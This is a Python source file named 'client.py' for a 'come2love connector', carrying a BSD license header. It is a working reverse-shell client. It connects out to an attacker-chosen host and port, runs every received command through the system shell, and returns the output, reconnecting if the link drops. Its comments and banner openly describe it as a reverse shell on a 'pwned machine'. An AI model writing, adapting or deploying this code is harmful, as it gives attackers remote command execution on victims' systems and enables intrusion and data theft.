# client.py - come2love connector program
# pwned!!!

"""
BSD 3-Clause License

Copyright (c) 2022, ringwormGO <ringwormgo@gmail.com>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

import socket
import subprocess
import sys

print("come2love connector - you are pwned!!1!1!11!1\n")

host = "127.0.0.1" # host must be defined by you. 127.0.0.1 is an example
port = 1080 # Change port on your demand.

def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	return s

def main(s):
	recv_output = s.recv(2048)
	print(recv_output.decode())
	s.sendall("You are connected to the pwned machine via a reverse shell".encode())
	#print("sent") # old debugger to make sure the code reached
	try:
		while True: 
                        recv_command = s.recv(2048) # Command must be < 2048 char
                        print(f"$ {recv_command.decode()}") # debug purpose

                        if recv_command.decode().lower() == "exit":
                                s.sendall("sesclosed".encode())
                                print("Session closed by exit command. Exiting...")
                                sys.exit(0)

                        call = subprocess.run(recv_command.decode(), shell=True, capture_output=True) # call the command and capture the output
                        output = call.stdout.decode()
                        error = call.stderr.decode()

                        realoutput = f"{output} {error}"

                        # both stdout and stderr must be sent

                        s.sendall(realoutput.encode())

	except BrokenPipeError:
		s = connect(host, port)
		main(s)

s = connect(host, port)

if __name__ == "__main__":
	main(s)
